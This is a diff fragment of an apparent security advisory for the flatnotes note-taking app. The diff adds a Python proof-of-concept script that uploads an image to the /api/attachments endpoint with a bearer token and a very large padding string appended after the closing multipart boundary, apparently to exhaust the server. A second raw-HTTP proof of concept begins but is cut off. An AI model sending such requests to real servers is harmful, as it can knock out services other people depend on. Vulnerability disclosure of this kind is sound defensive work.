@@ -3,9 +3,37 @@ Anyone who can log in to flatnotes and upload images through the function can ca
 
 ### Impact  
 ![image](https://github.com/user-attachments/assets/3f75eeb5-c5cd-4570-92b6-3e3b3fdab0f5)
+### Proof of Concept 1
+```
+import requests
 
+url = "http://192.168.137.11:8080/api/attachments"
 
-### Proof of Concept 
+headers = {
+    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoxNzMzMzg1NzA4fQ.GI9swgQd0pDSP0q4mgLc-pMV94xl4KE5_jJNenZChmc",
+    "Accept-Language": "zh-CN,zh;q=0.9",
+    "Accept": "application/json, text/plain, */*",
+    "Content-Type": "multipart/form-data",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
+    "Origin": "http://192.168.137.11:8080",
+    "Referer": "http://192.168.137.11:8080/new",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Cookie": "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoxNzMzMzg1NzA4fQ.GI9swgQd0pDSP0q4mgLc-pMV94xl4KE5_jJNenZChmc",
+    "Connection": "keep-alive"
+}
+
+data = (
+    "------WebKitFormBoundaryN20AMdlOKTaspeAy\r\n"
+    "Content-Disposition: form-data; name=\"file\"; filename=\"sword.png\"\r\n"
+    "Content-Type: image/png\r\n\r\n" + file_content+ "\r\n"
+    "------WebKitFormBoundaryN20AMdlOKTaspeAy--"+"0123456789"*50000+"\r\n"
+)
+
+response = requests.post(url, headers=headers, data=data)
+
+```
+
+### Proof of Concept 2
 ```
 POST /api/attachments HTTP/1.1
 Host: 192.168.137.11:8080
